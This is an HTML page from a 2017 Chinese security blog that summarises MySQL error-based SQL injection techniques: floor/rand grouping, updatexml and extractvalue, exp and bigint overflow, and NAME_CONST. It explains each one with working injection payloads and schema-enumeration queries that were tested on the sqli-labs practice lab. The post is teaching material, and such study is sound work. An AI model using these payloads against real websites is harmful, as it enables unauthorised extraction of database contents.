@@ -1,0 +1,896 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="SQL注入," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="参考资料：http://www.waitalone.cn/mysql-error-based-injection.htmlhttp://www.111cn.net/database/mysql/47680.htm 一些基本的查基本信息的语句： 查库 (select schema_name from information_schema.schemata limit m,n) 查表 (select">
+<meta name="keywords" content="SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL报错注入总结">
+<meta property="og:url" content="http://whc.dropsec.xyz/2017/04/16/SQL报错注入总结/index.html">
+<meta property="og:site_name" content="Ha1g0的窝">
+<meta property="og:description" content="参考资料：http://www.waitalone.cn/mysql-error-based-injection.htmlhttp://www.111cn.net/database/mysql/47680.htm 一些基本的查基本信息的语句： 查库 (select schema_name from information_schema.schemata limit m,n) 查表 (select">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://i2.muimg.com/567571/348312529bf357fb.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/e60e90caa6f03d2d.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/29a88425dd842351.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/1d69376a029682e1.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/11177c1b1910f075.png">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006HJ39wgy1fffdiqh36vj318u0dkajc.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006HJ39wgy1fffdk4awm6j31830dbk0l.jpg">
+<meta property="og:image" content="http://i2.muimg.com/567571/677277689e425d96.png">
+<meta property="og:image" content="http://i2.muimg.com/567571/2c3a0b9bb9b9b544.png">
+<meta property="og:updated_time" content="2017-07-18T03:20:28.923Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL报错注入总结">
+<meta name="twitter:description" content="参考资料：http://www.waitalone.cn/mysql-error-based-injection.htmlhttp://www.111cn.net/database/mysql/47680.htm 一些基本的查基本信息的语句： 查库 (select schema_name from information_schema.schemata limit m,n) 查表 (select">
+<meta name="twitter:image" content="http://i2.muimg.com/567571/348312529bf357fb.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://whc.dropsec.xyz/2017/04/16/SQL报错注入总结/"/>
+
+
+
+
+
+  <title> SQL报错注入总结 | Ha1g0的窝 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+    <a href="https://github.com/whcjst"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ha1g0的窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://whc.dropsec.xyz/2017/04/16/SQL报错注入总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ha1g0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://i2.muimg.com/567571/93e407bf4ec3ebb7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ha1g0的窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                SQL报错注入总结
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-16T15:07:59+08:00">
+                2017-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="http://www.waitalone.cn/mysql-error-based-injection.html" target="_blank" rel="external">http://www.waitalone.cn/mysql-error-based-injection.html</a><br><a href="http://www.111cn.net/database/mysql/47680.htm" target="_blank" rel="external">http://www.111cn.net/database/mysql/47680.htm</a></p>
+<p>一些基本的查基本信息的语句：</p>
+<p>查库 (select schema_name from information_schema.schemata limit m,n)</p>
+<p>查表 (select table_name from information_schema.columns where table_schema=’whc’ limit 0,1)</p>
+<p>查字段 (select column_name from information_schema.columns where table_schema=’whc’ limit 0,1)</p>
+<p>加上limit 是因为sqllab里面限制了回显的个数，实战里面应该用不到。<br><a id="more"></a></p>
+<h3 id="00x1-floor方式"><a href="#00x1-floor方式" class="headerlink" title="00x1 floor方式"></a>00x1 floor方式</h3><p><strong>用法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select 1,count(*),concat(0x3a,0x3a,(select use()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</div></pre></td></tr></table></figure>
+<p><strong>函数释义：</strong></p>
+<blockquote>
+<p>rand() 随机数函数 产生0-1的随机数<br>count(_) 计数<br>floor() 向下取整函数，舍去小数点，比如：floor(1.3)=1<br>floor(rand()_2) 结果只有0和1<br>group by name 按name的首位字典顺序排列<br>concat() 连接括号里面的内容<br>select 1 from (table name) 派生表</p>
+</blockquote>
+<p>此处有三个点，一是需要count计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。</p>
+<p><strong>在sqllab less-5上进行测试</strong></p>
+<p><img src="http://i2.muimg.com/567571/348312529bf357fb.png" alt=""></p>
+<p>这里只用user()来做实例，其他爆表，爆字段直接代替user()就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1&apos; union select 1,count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+</div></pre></td></tr></table></figure>
+<p>可以简化成这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1&apos; and  (select count(*) from information_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand(0)*2))) --+</div></pre></td></tr></table></figure>
+<p>也可以改成这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1&apos; and  (select 1 from (select count(*),(concat(0x3a,user(),0x3a,floor(rand()*2)))name from information_schema.tables group by name)b --+</div></pre></td></tr></table></figure>
+<p>语句分解：</p>
+<blockquote>
+<p>(select 1 from b) //在b上做派生表<br>b=select count(_),name from information_schema.tables group by name //从information_schema里面选取那么的内容和计数的内容<br>name=concat(0x3a,(查询内容),0x3a,floor(rand()_2)) //把:和查询内容，还有随机取整数 连接在一起</p>
+</blockquote>
+<p>具体为什么count(_),floor(rand(0)_2) group by 会报错，必须说这三个元素必须全部放在一个语句里才能报错。<br><a href="http://mp.weixin.qq.com/s__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="external">http://mp.weixin.qq.com/s__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect</a></p>
+<ul>
+<li>解释下 select 1 from table</li>
+</ul>
+<p>它的作用就是 增加临时列，每行的列值是写在select后的数，这条sql语句中是1<br><img src="http://i2.muimg.com/567571/e60e90caa6f03d2d.png" alt=""></p>
+<ul>
+<li>rand(0) rand(1)和rand()的区别</li>
+</ul>
+<p><img src="http://i2.muimg.com/567571/29a88425dd842351.png" alt=""></p>
+<p>rand()会随机报错，就是有可能报错，有的时候不会，rand(0)肯定会报错，rand(1)则一定不会报错。<br>所以要让他报错的话直接用rand(0)</p>
+<h3 id="00x2-xpath函数"><a href="#00x2-xpath函数" class="headerlink" title="00x2 xpath函数"></a>00x2 xpath函数</h3><p>如果细究这个会浪费很多时间，而且我目前没怎么接触过XML，所以就简略地介绍下这个函数的用法了。<br>想了解的可以多搜索一些关于xpath注入，这也是sql注入的额一种趋势吧。</p>
+<ul>
+<li>updatexml()  最多爆出32位的</li>
+</ul>
+<p>函数原型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">updatexml(xml_target, xpath_expr, new_xml)</div></pre></td></tr></table></figure></p>
+<p>第一个参数是目标xml，第二个参数是xpath表达式，第三个参数替换目标xml的新的xml。注入中只关心第二个参数就够了。（XPath 是一门在 XML（可扩展标记语言）文档中查找信息的语言。）</p>
+<p>用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">updatexml(1,concat(0x3a,(查询内容),0x3a),1)</div></pre></td></tr></table></figure></p>
+<p>在MySQL控制台里面实测下</p>
+<p><img src="http://i2.muimg.com/567571/1d69376a029682e1.png" alt=""></p>
+<ul>
+<li>extractvalue()  最多爆出32位的</li>
+</ul>
+<p>extractvalue方式与updatexml类似，只是extractvalue()中少了第三个参数</p>
+<p>用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">extractvalue(1, concat(0x3a, (查询内容),0x3a))</div></pre></td></tr></table></figure>
+<p>在MySQL里实测下<br><img src="http://i2.muimg.com/567571/11177c1b1910f075.png" alt="">  </p>
+<p>注意几点，语句出错，想了半天没想明白怎么回事。是union语句连接2个语句的时候，2条语句所在的表形式不同所以返回不了。<br><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fffdiqh36vj318u0dkajc.jpg" alt=""><br><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fffdk4awm6j31830dbk0l.jpg" alt=""></p>
+<h3 id="00x3-值类型超出范围导致报错"><a href="#00x3-值类型超出范围导致报错" class="headerlink" title="00x3 值类型超出范围导致报错"></a>00x3 值类型超出范围导致报错</h3><p>在MySQL版本大于等于5.5.5的的时候才能用户</p>
+<ul>
+<li>double型函数exp()超出范围</li>
+</ul>
+<p>这个函数为以e为底的对数函数</p>
+<p>用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select exp(~(select*from(select user())x))</div></pre></td></tr></table></figure>
+<p>报错具体原理<a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="external">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
+<p><img src="http://i2.muimg.com/567571/677277689e425d96.png" alt=""></p>
+<ul>
+<li>bigint超出范围</li>
+</ul>
+<p>具体原理<a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="external">http://www.cnblogs.com/lcamry/articles/5509112.html</a><br>跟上面的差不多。</p>
+<h3 id="00x4-利用数据重复性"><a href="#00x4-利用数据重复性" class="headerlink" title="00x4 利用数据重复性"></a>00x4 利用数据重复性</h3><p>用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</div></pre></td></tr></table></figure></p>
+<p>这里的version(0出现了2次，所以报错。</p>
+<p><img src="http://i2.muimg.com/567571/2c3a0b9bb9b9b544.png" alt=""></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+	<div>
+  
+    
+<div style="text-align:center;color: #ccc;font-size:14px;">
+------ 本文结束 ------</div>
+<br/>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<span style="font-weight:blod">版权声明</span>
+<img src="http://7xqmjb.com1.z0.glb.clouddn.com/2017020242973cc.png" >
+<br/>
+<p style="font-size: 10px;line-height: 30px"><a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a> by <a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.<br/>
+由<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo</a>创作并维护的<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br/>
+本文首发于<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a> 博客（ <a href="http://whc.dropsec.xyz" style="color:#258FC6">http://whc.dropsec.xyz</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+
+  
+</div>
+	
+	
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/04/20/实验吧决斗场Writeup/" rel="prev" title="实验吧决斗场Writeup">
+                实验吧决斗场Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://i2.muimg.com/567571/93e407bf4ec3ebb7.jpg"
+               alt="Ha1g0" />
+          <p class="site-author-name" itemprop="name">Ha1g0</p>
+           
+              <p class="site-description motion-element" itemprop="description">最近博客重新搭建了，顺便清空了一些以前看起来有些zz的文章</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/whcjst" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xq.dropsec.xyz/" title="Mr_white" target="_blank">Mr_white</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yaocl.cn/" title="Mr_Yao" target="_blank">Mr_Yao</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://w3dr.github.io/" title="w3dr" target="_blank">w3dr</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料："><span class="nav-number">1.</span> <span class="nav-text">参考资料：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x1-floor方式"><span class="nav-number">2.</span> <span class="nav-text">00x1 floor方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x2-xpath函数"><span class="nav-number">3.</span> <span class="nav-text">00x2 xpath函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x3-值类型超出范围导致报错"><span class="nav-number">4.</span> <span class="nav-text">00x3 值类型超出范围导致报错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#00x4-利用数据重复性"><span class="nav-number">5.</span> <span class="nav-text">00x4 利用数据重复性</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ha1g0</span>
+</div>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+</body>
+</html>
